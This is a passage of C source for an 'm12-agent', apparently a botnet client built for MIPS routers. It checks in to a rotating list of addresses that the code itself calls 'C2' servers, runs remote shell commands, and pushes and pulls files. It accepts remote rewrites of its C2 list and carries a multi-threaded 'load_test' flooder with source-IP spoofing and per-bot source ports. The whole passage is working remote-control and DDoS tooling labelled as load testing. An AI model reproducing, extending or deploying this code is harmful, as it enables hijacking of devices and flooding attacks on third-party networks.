    if (probe_ok == 0) {
      fprintf(stderr, "load_test: pre-flight — target not responding on any of 10 probes (continuing anyway)\n");
    }

    /* Phase 2: 100 unique 5-tuples for conntrack estimation */
    int tuple_ok = 0;
    uint16_t probe_port = 32768;
    for (int t = 0; t < 100; t++) {
      int pfd = socket(AF_INET, SOCK_DGRAM, 0);
      if (pfd < 0) break;
      int reuse = 1;
      setsockopt(pfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
      struct sockaddr_in ba;
      memset(&ba, 0, sizeof(ba));
      ba.sin_family = AF_INET;
      ba.sin_port = htons(probe_port++);
      ba.sin_addr.s_addr = INADDR_ANY;
      if (bind(pfd, (struct sockaddr *)&ba, sizeof(ba)) != 0) { close(pfd); continue; }

      struct sockaddr_in da;
      memset(&da, 0, sizeof(da));
      da.sin_family = AF_INET;
      da.sin_port = htons(port);
      inet_pton(AF_INET, target, &da.sin_addr);

      char tbuf[24] = {0};
      ssize_t n = sendto(pfd, tbuf, sizeof(tbuf), 0,
                         (struct sockaddr *)&da, sizeof(da));
      if (n >= 0) { tuple_ok++; probe_sent++; }
      close(pfd);
    }
    if (probe_sent > 0) {
      conntrack_drop_pct = 100 - (tuple_ok * 100 / probe_sent);
      fprintf(stderr, "load_test: pre-flight conntrack probe — %d/%d tuples succeeded (%d%% drop)\n",
              tuple_ok, probe_sent, conntrack_drop_pct);
    }
  }

  rate_limiter_t shared_rl;
  rate_limiter_t *shared_rl_ptr = NULL;
  if (aggregate) {
    if (rate_limiter_init(&shared_rl, pps, bps, pps * 0.1, bps * 0.1) != 0) {
      snprintf(out, out_cap, "load_test: rate limiter init failed");
      return -1;
    }
    shared_rl_ptr = &shared_rl;
  }

  double per_thread_pps = pps / threads;
  double per_thread_bps = bps / threads;

  load_thread_arg_t args[LOAD_MAX_THREADS];
  pthread_t tids[LOAD_MAX_THREADS];
  int thread_started[LOAD_MAX_THREADS] = {0};

  unsigned int bot_hash = 0;
  if (src_port_base) {
    for (const char *c = g_cfg.node; *c; c++)
      bot_hash = bot_hash * 2654435761u + (unsigned char)*c;
  }

  for (int i = 0; i < threads; i++) {
    memset(&args[i], 0, sizeof(args[i]));
    args[i].thread_id = i;
    memcpy(args[i].target, target, sizeof(target));
    args[i].port = port;
    args[i].duration = duration;
    args[i].proto_tcp = proto_tcp;
    args[i].mode = mode;
    args[i].pattern = pattern;
    args[i].src_port = src_port_base
      ? (uint16_t)(src_port_base + (bot_hash % SRC_PORT_WINDOWS) * threads + i)
      : 0;
    args[i].pps = per_thread_pps;
    args[i].bps = per_thread_bps;
    args[i].shared_rl = shared_rl_ptr;
    args[i].port_base = port_base;
    args[i].port_span = port_span;
    args[i].port_stride = port_stride;
    args[i].spoof_enabled = spoof_source;
    args[i].src_ips = src_ip_count > 0 ? src_ips : NULL;
    args[i].src_ip_count = src_ip_count;
    args[i].start_mono_ns = start_mono_ns;
    args[i].phases = phase_count > 0 ? phases : NULL;
    args[i].phase_count = phase_count;
    if (pthread_create(&tids[i], NULL, load_thread_fn, &args[i]) == 0)
      thread_started[i] = 1;
  }

  /* Heartbeat thread: 500ms periodic stats POST while test runs. */
  heartbeat_ctx_t hb_ctx = { .args = args, .threads = threads, .running = 1, .cmd_id = cmd_id };
  pthread_t hb_tid;
  int hb_started = (cmd_id && pthread_create(&hb_tid, NULL, heartbeat_thread_fn, &hb_ctx) == 0);

  /* Watchdog: if senders haven't finished after total duration+10s, force-cancel them.
   * Uses a separate thread instead of pthread_timedjoin_np (glibc-only). */
  double total_duration = duration;
  if (phase_count > 0) {
    total_duration = 0;
    for (int i = 0; i < phase_count; i++) total_duration += phases[i].duration_s;
  }

  typedef struct { pthread_t *tids; int *started; int count; double timeout; volatile int done; } wdog_ctx_t;
  wdog_ctx_t wdog = { .tids = tids, .started = thread_started, .count = threads,
                       .timeout = total_duration + 10.0, .done = 0 };
  pthread_t wdog_tid;
  int wdog_started = (pthread_create(&wdog_tid, NULL, wdog_thread_fn, &wdog) == 0);

  uint64_t agg_bytes = 0, agg_ops = 0;
  uint64_t agg_eagain = 0, agg_connreset = 0, agg_pipe = 0;
  uint64_t agg_connrefused = 0, agg_enobufs = 0, agg_ehostunreach = 0;
  uint64_t agg_eacces = 0, agg_eperm = 0, agg_enetunreach = 0, agg_err_other = 0;
  int first_other_errno = 0;
  uint32_t agg_retransmits = 0;
  uint32_t rtt_min = 0, rtt_max = 0;
  uint64_t rtt_sum = 0, rttvar_sum = 0;
  int rtt_count = 0;
  int any_unreachable = 0;
  uint64_t first_unreachable = 0;

  for (int i = 0; i < threads; i++) {
    if (!thread_started[i]) continue;
    pthread_join(tids[i], NULL);
    agg_bytes        += args[i].total_bytes;
    agg_ops          += args[i].total_ops;
    agg_eagain       += args[i].err_eagain;
    agg_connreset    += args[i].err_connreset;
    agg_pipe         += args[i].err_pipe;
    agg_connrefused  += args[i].err_connrefused;
    agg_enobufs      += args[i].err_enobufs;
    agg_ehostunreach += args[i].err_ehostunreach;
    agg_eacces       += args[i].err_eacces;
    agg_eperm        += args[i].err_eperm;
    agg_enetunreach  += args[i].err_enetunreach;
    agg_err_other    += args[i].err_other;
    if (args[i].first_other_errno && !first_other_errno)
      first_other_errno = args[i].first_other_errno;
    if (!args[i].target_reachable) any_unreachable = 1;
    if (args[i].first_unreachable_ns &&
        (!first_unreachable || args[i].first_unreachable_ns < first_unreachable))
      first_unreachable = args[i].first_unreachable_ns;
    if (proto_tcp && args[i].rtt_us > 0) {
      agg_retransmits += args[i].retransmits;
      rtt_sum    += args[i].rtt_us;
      rttvar_sum += args[i].rttvar_us;
      rtt_count++;
      if (args[i].min_rtt_us < rtt_min || rtt_min == 0) rtt_min = args[i].min_rtt_us;
      if (args[i].max_rtt_us > rtt_max) rtt_max = args[i].max_rtt_us;
    }
  }
  wdog.done = 1;
  if (wdog_started) { pthread_cancel(wdog_tid); pthread_join(wdog_tid, NULL); }
  hb_ctx.running = 0;
  if (hb_started) pthread_join(hb_tid, NULL);
  if (shared_rl_ptr) rate_limiter_destroy(shared_rl_ptr);

  double mbps = (double)agg_bytes * 8.0 / total_duration / 1e6;
  uint64_t total_errs = agg_eagain + agg_connreset + agg_pipe + agg_connrefused
                      + agg_enobufs + agg_ehostunreach + agg_eacces
                      + agg_eperm + agg_enetunreach + agg_err_other;
  const char *mode_name = (mode >= 0 && mode < MODE_COUNT && load_modes[mode].name) ? load_modes[mode].name : "udp_raw";

  int w = snprintf(out, out_cap,
           "load_test: mode=%s proto=%s target=%s:%d threads=%d duration=%.0fs "
           "total_bytes=%llu total_ops=%llu throughput=%.1f Mbps",
           mode_name, proto_tcp ? "tcp" : "udp", target, port, threads, total_duration,
           (unsigned long long)agg_bytes, (unsigned long long)agg_ops, mbps);

  if (proto_tcp && rtt_count > 0 && w > 0 && (size_t)w < out_cap) {
    uint32_t rtt_avg = (uint32_t)(rtt_sum / rtt_count);
    uint32_t jitter_avg = (uint32_t)(rttvar_sum / rtt_count);
    double retrans_pct = agg_ops > 0 ? 100.0 * agg_retransmits / (double)agg_ops : 0.0;
    w += snprintf(out + w, out_cap - w,
                  " rtt_ms=%.1f/%.1f/%.1f jitter_ms=%.1f retransmits=%u(%.2f%%)",
                  (double)rtt_min / 1000.0, (double)rtt_avg / 1000.0,
                  (double)rtt_max / 1000.0, (double)jitter_avg / 1000.0,
                  agg_retransmits, retrans_pct);
  }

  if (total_errs > 0 && w > 0 && (size_t)w < out_cap) {
    if (proto_tcp) {
      w += snprintf(out + w, out_cap - w,
               " errors=%llu (EAGAIN=%llu CONNRESET=%llu EPIPE=%llu other=%llu)",
               (unsigned long long)total_errs,
               (unsigned long long)agg_eagain, (unsigned long long)agg_connreset,
               (unsigned long long)agg_pipe, (unsigned long long)agg_err_other);
    } else {
      w += snprintf(out + w, out_cap - w,
               " errors=%llu (EAGAIN=%llu CONNREFUSED=%llu ENOBUFS=%llu EHOSTUNREACH=%llu EACCES=%llu EPERM=%llu ENETUNREACH=%llu other=%llu)",
               (unsigned long long)total_errs,
               (unsigned long long)agg_eagain, (unsigned long long)agg_connrefused,
               (unsigned long long)agg_enobufs, (unsigned long long)agg_ehostunreach,
               (unsigned long long)agg_eacces, (unsigned long long)agg_eperm,
               (unsigned long long)agg_enetunreach, (unsigned long long)agg_err_other);
    }
  if (first_other_errno && w > 0 && (size_t)w < out_cap) {
    w += snprintf(out + w, out_cap - w, " first_unknown_errno=%d", first_other_errno);
  }
  if (any_unreachable && w > 0 && (size_t)w < out_cap) {
    w += snprintf(out + w, out_cap - w, " target_reachable=false");
  }
  if (first_unreachable && w > 0 && (size_t)w < out_cap) {
    w += snprintf(out + w, out_cap - w, " first_unreachable_ns=%llu",
                  (unsigned long long)first_unreachable);
  }
  if (conntrack_drop_pct >= 0 && w > 0 && (size_t)w < out_cap) {
    w += snprintf(out + w, out_cap - w, " conntrack_drop_pct=%d", conntrack_drop_pct);
  }
  if (!proto_tcp && pattern == 1 && w > 0 && (size_t)w < out_cap) {
    w += snprintf(out + w, out_cap - w,
             "\nnote: pattern=zeros carries no sequence counter — reorder, dup, and loss are undetectable. Use pattern=seq for delivery measurement.");
  }
  return 0;
}

static volatile int g_config_updated;
static void cfg_set(char *dst, size_t cap, const char *val);
static void parse_addresses(const char *val);

/* Handle CONFIG_UPDATE opcode: parse new addresses from the command JSON,
 * update runtime config and persist to disk. Format:
 *   {"__m12":"config_update","addresses":"host1:port1,host2:port2,..."}
 */
static int handle_config_update(const char *json, int len) {
  (void)len;
  const char *key = "\"addresses\":\"";
  const char *start = strstr(json, key);
  if (!start) return -1;
  start += strlen(key);
  const char *end = strchr(start, '"');
  if (!end || end - start > 1024) return -1;

  char addrs[1024];
  int n = (int)(end - start);
  memcpy(addrs, start, n);
  addrs[n] = 0;

  parse_addresses(addrs);
  if (g_cfg.addr_count == 0) return -1;

  const char *cf = getenv("M12_CONFIG");
  const char *path = (cf && *cf) ? cf : CONFIG_PATH;
  /* Rewrite config file preserving non-addresses lines */
  FILE *fr = fopen(path, "r");
  char tmppath[300];
  snprintf(tmppath, sizeof(tmppath), "%s.tmp", path);
  FILE *fw = fopen(tmppath, "w");
  if (!fw) { if (fr) fclose(fr); return -1; }
  if (fr) {
    char line[512];
    while (fgets(line, sizeof(line), fr)) {
      char *p = line;
      while (*p == ' ' || *p == '\t') p++;
      if (strncmp(p, "addresses", 9) == 0) {
        char *eq = strchr(p, '=');
        if (eq) continue;
      }
      fputs(line, fw);
    }
    fclose(fr);
  }
  fprintf(fw, "addresses = %s\n", addrs);
  fflush(fw);
  fsync(fileno(fw));
  fclose(fw);
  rename(tmppath, path);

  fprintf(stderr, "m12-agent: config_update addresses=%s (count=%d)\n", addrs, g_cfg.addr_count);
  g_config_updated = 1;
  return 0;
}

/* Build the leading "node":"<id>", JSON fragment (empty when no id is known, so
 * the server falls back to the cert CN). g_cfg.node is charset-safe (hex id or
 * an operator-set value), so no escaping is needed. */
static void node_field(char *dst, size_t cap) {
  if (g_cfg.node[0]) snprintf(dst, cap, "\"node\":\"%s\",", g_cfg.node);
  else if (cap) dst[0] = 0;
}

/* Parse the "commands" array from the /ingest response body, run each command,
 * and POST its output back. Command objects are flat {"id":..,"cmd":..}. */
static void process_commands(const char *json) {
  jsmn_parser p;
  jsmn_init(&p);
  static jsmntok_t toks[MAX_TOKS];
  int n = jsmn_parse(&p, json, strlen(json), toks, MAX_TOKS);
  if (n < 0) return;

  int ca = -1;
  for (int i = 0; i < n - 1; i++) {
    if (tok_eq(json, &toks[i], "commands") && toks[i + 1].type == JSMN_ARRAY) { ca = i + 1; break; }
  }
  if (ca < 0) return;

  int count = toks[ca].size;
  int t = ca + 1;
  for (int e = 0; e < count; e++) {
    if (toks[t].type != JSMN_OBJECT) break;
    int pairs = toks[t].size, cur = t + 1;
    const char *id = NULL, *cmd = NULL;
    int idlen = 0, cmdlen = 0;
    for (int k = 0; k < pairs; k++) {
      jsmntok_t *key = &toks[cur], *val = &toks[cur + 1];
      if (tok_eq(json, key, "id")) { id = json + val->start; idlen = val->end - val->start; }
      else if (tok_eq(json, key, "cmd")) { cmd = json + val->start; cmdlen = val->end - val->start; }
      cur += 2; /* flat objects: each value is a scalar token */
    }
    t = cur;

    if (!id || !cmd) continue;

    static char idbuf[64];
    int il = idlen < (int)sizeof(idbuf) - 1 ? idlen : (int)sizeof(idbuf) - 1;
    memcpy(idbuf, id, il);
    idbuf[il] = 0;

    static char cmdbuf[4096];
    json_unescape(cmd, cmdlen, cmdbuf, sizeof(cmdbuf));

    static char out[OUT_CAP];
    int exit_code = 0;
    if (strncmp(cmdbuf, "{\"__m12\":", 9) == 0) {
      int cl = (int)strlen(cmdbuf);
      if (strstr(cmdbuf, "\"file_push\"")) {
        exit_code = handle_file_push(cmdbuf, cl) == 0 ? 0 : 1;
        snprintf(out, sizeof(out), exit_code == 0 ? "file_push: OK" : "file_push: FAILED");
      } else if (strstr(cmdbuf, "\"file_pull\"")) {
        exit_code = handle_file_pull(cmdbuf, cl) == 0 ? 0 : 1;
        snprintf(out, sizeof(out), exit_code == 0 ? "file_pull: OK" : "file_pull: FAILED");
      } else if (strstr(cmdbuf, "\"config_update\"")) {
        exit_code = handle_config_update(cmdbuf, cl) == 0 ? 0 : 1;
        snprintf(out, sizeof(out), exit_code == 0 ? "config_update: OK (count=%d)" : "config_update: FAILED", g_cfg.addr_count);
      } else if (strstr(cmdbuf, "\"discovery\"")) {
        exit_code = handle_discovery(cmdbuf, cl, out, sizeof(out)) == 0 ? 0 : 1;
      } else if (strstr(cmdbuf, "\"load_test\"")) {
        exit_code = handle_load_test(cmdbuf, cl, out, sizeof(out), idbuf) == 0 ? 0 : 1;
      } else {
        const char *vstart = cmdbuf + 9;
        while (*vstart == ' ' || *vstart == '"') vstart++;
        char opname[64];
        int oi = 0;
        while (vstart[oi] && vstart[oi] != '"' && vstart[oi] != ',' && vstart[oi] != '}' && oi < (int)sizeof(opname) - 1) oi++;
        memcpy(opname, vstart, oi);
        opname[oi] = 0;
        snprintf(out, sizeof(out),
                 "{\"__m12\":\"error\",\"reason\":\"unknown_opcode\",\"opcode\":\"%s\",\"agent_version\":%d}",
                 opname, M12_PROTO_VERSION);
        exit_code = 1;
        fprintf(stderr, "m12-agent: unknown opcode: %s\n", opname);
      }
    } else {
      run_command(cmdbuf, out, sizeof(out), &exit_code);
    }

    static char esc[ESC_CAP];
    json_escape(out, strlen(out), esc, sizeof(esc));

    char nodefld[96];
    node_field(nodefld, sizeof(nodefld));
    static char body[BODY_CAP];
    int bl = snprintf(body, sizeof(body), "{%s\"id\":\"%s\",\"output\":\"%s\",\"exitCode\":%d}", nodefld, idbuf, esc, exit_code);
    if (bl < 0 || bl >= (int)sizeof(body)) continue;

    static char r2[2048];
    int code = https_request(HTTP_OUTPUT_PATH, body, r2, sizeof(r2));
    if (code != 200) fprintf(stderr, "output POST for %s: HTTP %d\n", idbuf, code);
  }
}

/* ---------- node id from MAC ---------- */

/* Read a MAC from /sys/class/net/<if>/address ("aa:bb:cc:dd:ee:ff"). Rejects a
 * missing file and the all-zero MAC. Returns 0 and fills out on success. */
static int read_mac(const char *path, char *out, size_t cap) {
  FILE *f = fopen(path, "r");
  if (!f) return -1;
  char buf[32] = { 0 };
  char *got = fgets(buf, sizeof(buf), f);
  fclose(f);
  if (!got) return -1;
  buf[strcspn(buf, "\r\n")] = 0;
  if (strlen(buf) != 17) return -1;                 /* exactly aa:bb:cc:dd:ee:ff */
  if (!strcmp(buf, "00:00:00:00:00:00")) return -1;
  if (strlen(buf) >= cap) return -1;
  strcpy(out, buf);
  return 0;
}

/* "node-" + 12 lowercase hex (colons stripped) -> matches the server's node-id
 * rule ^[a-z][a-z0-9-]{1,63}$. Returns 0 on success. */
static int format_node_id(const char *mac, char *out, size_t cap) {
  char hex[13];
  int h = 0;
  for (const char *p = mac; *p && h < 12; p++) {
    char c = *p;
    if (c == ':') continue;
    if (c >= 'A' && c <= 'F') c = (char)(c - 'A' + 'a');
    hex[h++] = c;
  }
  hex[h] = 0;
  if (h != 12) return -1;
  return ((size_t)snprintf(out, cap, "node-%s", hex) < cap) ? 0 : -1;
}

/* Derive a stable node id from this device's primary interface MAC. Tries the
 * usual router interface names first (and $M12_IFACE if set), then scans
 * /sys/class/net, skipping loopback. Returns 0 on success. */
static int derive_node_id(char *out, size_t cap) {
  char path[300], mac[32];
  const char *env_if = getenv("M12_IFACE");
  const char *pref[] = { env_if, "eth0", "eth1", "br-lan", "br0", "wlan0", NULL };
  for (int i = 0; pref[i]; i++) {
    if (!pref[i][0]) continue;
    snprintf(path, sizeof(path), "/sys/class/net/%s/address", pref[i]);
    if (read_mac(path, mac, sizeof(mac)) == 0) return format_node_id(mac, out, cap);
  }
  DIR *d = opendir("/sys/class/net");
  if (d) {
    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
      if (e->d_name[0] == '.' || !strcmp(e->d_name, "lo")) continue;
      snprintf(path, sizeof(path), "/sys/class/net/%s/address", e->d_name);
      if (read_mac(path, mac, sizeof(mac)) == 0) { closedir(d); return format_node_id(mac, out, cap); }
    }
    closedir(d);
  }

  /* Fallback: derive from the device's outbound IP. Works on stripped BusyBox
   * where /sys/class/net is absent. Opens a throwaway UDP socket to find which
   * local IP the kernel would use to reach the internet. No packet is sent. */
  {
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &sa.sin_addr);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s >= 0) {
      if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
        struct sockaddr_in local;
        socklen_t slen = sizeof(local);
        if (getsockname(s, (struct sockaddr *)&local, &slen) == 0) {
          char ipstr[INET_ADDRSTRLEN];
          inet_ntop(AF_INET, &local.sin_addr, ipstr, sizeof(ipstr));
          close(s);
          char buf[32];
          int bi = 0;
          for (const char *p = ipstr; *p && bi < (int)sizeof(buf) - 1; p++)
            buf[bi++] = (*p == '.') ? '-' : *p;
          buf[bi] = 0;
          return ((size_t)snprintf(out, cap, "node-%s", buf) < cap) ? 0 : -1;
        }
      }
      close(s);
    }
  }
  return -1;
}

/* ---------- runtime configuration ---------- */

#define FAILOVER_THRESHOLD 5

/* Copy val into dst (bounded, always NUL-terminated). NULL val is a no-op,
 * so an unset env var / absent key leaves the previous value in place. */
static void cfg_set(char *dst, size_t cap, const char *val) {
  if (!val) return;
  size_t n = strlen(val);
  if (n >= cap) n = cap - 1;
  memcpy(dst, val, n);
  dst[n] = 0;
}

/* Parse "host:port,host2:port2,..." into g_cfg.addrs[].
 * Sets g_cfg.addr_count and activates index 0. */
static void parse_addresses(const char *val) {
  if (!val || !*val) return;
  g_cfg.addr_count = 0;
  const char *p = val;
  while (*p && g_cfg.addr_count < MAX_C2_ADDRS) {
    const char *comma = strchr(p, ',');
    int len = comma ? (int)(comma - p) : (int)strlen(p);
    char buf[160];
    if (len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
    memcpy(buf, p, len);
    buf[len] = 0;
    /* Trim whitespace */
    char *s = buf;
    while (*s == ' ' || *s == '\t') s++;
    char *e = s + strlen(s);
    while (e > s && (e[-1] == ' ' || e[-1] == '\t')) e--;
    *e = 0;
    if (*s) {
      c2_addr_t *a = &g_cfg.addrs[g_cfg.addr_count];
      char *colon = strrchr(s, ':');
      if (colon && colon != s) {
        *colon = 0;
        cfg_set(a->host, sizeof(a->host), s);
        cfg_set(a->port, sizeof(a->port), colon + 1);
      } else {
        cfg_set(a->host, sizeof(a->host), s);
        cfg_set(a->port, sizeof(a->port), g_cfg.port[0] ? g_cfg.port : SERVER_PORT);
      }
      g_cfg.addr_count++;
    }
    p = comma ? comma + 1 : p + len;
  }
  if (g_cfg.addr_count > 0) {
    g_cfg.addr_idx = 0;
    cfg_set(g_cfg.host, sizeof(g_cfg.host), g_cfg.addrs[0].host);
    cfg_set(g_cfg.port, sizeof(g_cfg.port), g_cfg.addrs[0].port);
  }
}

/* Advance to the next C2 address in the list (wraps around). */
static void failover_advance(void) {
  if (g_cfg.addr_count < 2) return;
  g_cfg.addr_idx = (g_cfg.addr_idx + 1) % g_cfg.addr_count;
  cfg_set(g_cfg.host, sizeof(g_cfg.host), g_cfg.addrs[g_cfg.addr_idx].host);
  cfg_set(g_cfg.port, sizeof(g_cfg.port), g_cfg.addrs[g_cfg.addr_idx].port);
  fprintf(stderr, "m12-agent: failover -> %s:%s (addr %d/%d)\n",
          g_cfg.host, g_cfg.port, g_cfg.addr_idx + 1, g_cfg.addr_count);
}

/* Parse a "key = value" config file. Blank lines and '#' comments are ignored,
 * as are unknown keys; a missing file is not an error. Recognised keys:
 *   host, port, region, ca, cert, key */
static void cfg_load_file(const char *path) {
  FILE *f = fopen(path, "r");
  if (!f) return;
  char line[512];
  while (fgets(line, sizeof(line), f)) {
    char *p = line;
    while (*p == ' ' || *p == '\t') p++;
    if (*p == '#' || *p == '\n' || *p == '\r' || *p == 0) continue;
    char *eq = strchr(p, '=');
    if (!eq) continue;
    char *key = p, *val = eq + 1;
    char *ke = eq;                                   /* trim trailing key space */
    while (ke > key && (ke[-1] == ' ' || ke[-1] == '\t')) ke--;
    *ke = 0;
    while (*val == ' ' || *val == '\t') val++;       /* trim leading value space */
    char *ve = val + strlen(val);                    /* trim trailing value ws/nl */
    while (ve > val && (ve[-1] == '\n' || ve[-1] == '\r' || ve[-1] == ' ' || ve[-1] == '\t')) ve--;
    *ve = 0;

    if      (!strcmp(key, "host"))   cfg_set(g_cfg.host,   sizeof(g_cfg.host),   val);
    else if (!strcmp(key, "port"))   cfg_set(g_cfg.port,   sizeof(g_cfg.port),   val);
    else if (!strcmp(key, "region")) cfg_set(g_cfg.region, sizeof(g_cfg.region), val);
    else if (!strcmp(key, "ca"))     cfg_set(g_cfg.ca,     sizeof(g_cfg.ca),     val);
    else if (!strcmp(key, "cert"))   cfg_set(g_cfg.cert,   sizeof(g_cfg.cert),   val);
    else if (!strcmp(key, "key"))    cfg_set(g_cfg.key,    sizeof(g_cfg.key),    val);
    else if (!strcmp(key, "identity")) cfg_set(g_cfg.identity, sizeof(g_cfg.identity), val);
    else if (!strcmp(key, "node"))     cfg_set(g_cfg.node,     sizeof(g_cfg.node),     val);
    else if (!strcmp(key, "addresses")) parse_addresses(val);
  }
  fclose(f);
}

static void load_config(void) {
  /* 1. compile-time defaults */
  cfg_set(g_cfg.host,   sizeof(g_cfg.host),   SERVER_HOST);
  cfg_set(g_cfg.port,   sizeof(g_cfg.port),   SERVER_PORT);
  cfg_set(g_cfg.region, sizeof(g_cfg.region), NODE_REGION);
  cfg_set(g_cfg.ca,     sizeof(g_cfg.ca),     CA_PATH);
  cfg_set(g_cfg.cert,   sizeof(g_cfg.cert),   CERT_PATH);
  cfg_set(g_cfg.key,    sizeof(g_cfg.key),    KEY_PATH);
  cfg_set(g_cfg.identity, sizeof(g_cfg.identity), IDENTITY_PATH);
  cfg_set(g_cfg.node,   sizeof(g_cfg.node),   NODE_ID);

  /* 2. config file: $M12_CONFIG if set, else CONFIG_PATH (silently skipped if absent) */
  const char *cf = getenv("M12_CONFIG");
  cfg_load_file(cf && *cf ? cf : CONFIG_PATH);

  /* 3. environment overrides (highest precedence) */
  cfg_set(g_cfg.host,   sizeof(g_cfg.host),   getenv("M12_HOST"));
  cfg_set(g_cfg.port,   sizeof(g_cfg.port),   getenv("M12_PORT"));
  cfg_set(g_cfg.region, sizeof(g_cfg.region), getenv("M12_REGION"));
  cfg_set(g_cfg.ca,     sizeof(g_cfg.ca),     getenv("M12_CA"));
  cfg_set(g_cfg.cert,   sizeof(g_cfg.cert),   getenv("M12_CERT"));
  cfg_set(g_cfg.key,    sizeof(g_cfg.key),    getenv("M12_KEY"));
  cfg_set(g_cfg.identity, sizeof(g_cfg.identity), getenv("M12_IDENTITY"));
  cfg_set(g_cfg.node,   sizeof(g_cfg.node),   getenv("M12_NODE"));
  parse_addresses(getenv("M12_ADDRESSES"));

  /* Ensure the address list is populated — single-address fallback */
  if (g_cfg.addr_count == 0 && g_cfg.host[0]) {
    cfg_set(g_cfg.addrs[0].host, sizeof(g_cfg.addrs[0].host), g_cfg.host);
    cfg_set(g_cfg.addrs[0].port, sizeof(g_cfg.addrs[0].port), g_cfg.port);
    g_cfg.addr_count = 1;
    g_cfg.addr_idx = 0;
  }

  /* 4. no explicit id anywhere -> derive a stable one from the MAC, so one
   *    identical fleet binary still reports as a distinct node per device.
   *    (Left empty only if no usable interface is found; the server then falls
   *    back to the certificate CN.) */
  if (!g_cfg.node[0]) derive_node_id(g_cfg.node, sizeof(g_cfg.node));
}

int main(int argc, char **argv) {
  int interval = 60;
  const char *status = "healthy";

  for (int i = 1; i < argc; i++) {
    int n = atoi(argv[i]);
    if (n > 0) interval = n;
    else status = argv[i];
  }

  load_config();
  srand(time(NULL) ^ getpid());

  for (;;) {
    if (setup_tls() != 0) {
      cleanup_tls();
      fprintf(stderr, "m12-agent: TLS init failed, retrying in %ds\n", interval);
      sleep_jitter(interval);
      continue;
    }

    fprintf(stderr, "m12-agent: %s:%s interval=%ds node=%s\n",
            g_cfg.host, g_cfg.port, interval, g_cfg.node[0] ? g_cfg.node : "(cert CN)");

    int failures = 0;
    g_config_updated = 0;
    while (failures < 30 && !g_config_updated) {
      char nodefld[96];
      node_field(nodefld, sizeof(nodefld));
      static char tjson[320];
      snprintf(tjson, sizeof(tjson),
               "{%s\"v\":%d,\"status\":\"%s\",\"region\":\"%s\",\"metrics\":{\"cpu\":%.1f,\"mem\":%.1f}}",
               nodefld, M12_PROTO_VERSION, status, g_cfg.region, cpu_percent(), mem_percent());

      static char resp[RESP_CAP];
      int code = https_request(HTTP_PATH, tjson, resp, sizeof(resp));
      if (code == 200) {
        process_commands(http_body(resp));
        failures = 0;
      } else {
        if (++failures % FAILOVER_THRESHOLD == 0) failover_advance();
        fprintf(stderr, "check-in failed: HTTP %d (%d/30)\n", code, failures);
      }

      sleep_jitter(interval);
    }

    if (g_config_updated) {
      fprintf(stderr, "m12-agent: config updated, reconnecting to %s:%s\n", g_cfg.host, g_cfg.port);
    } else {
      fprintf(stderr, "m12-agent: 30 consecutive failures, reinitializing TLS\n");
    }
    cleanup_tls();
    sleep_jitter(interval);
  }

  return 0;
}

/*
 * Static build (cross-compile for the device's MIPS toolchain):
 *   see client/Makefile  ->  make CROSS=mips-linux-gnu-
 * Library order matters: -lmbedtls -lmbedx509 -lmbedcrypto.
 */
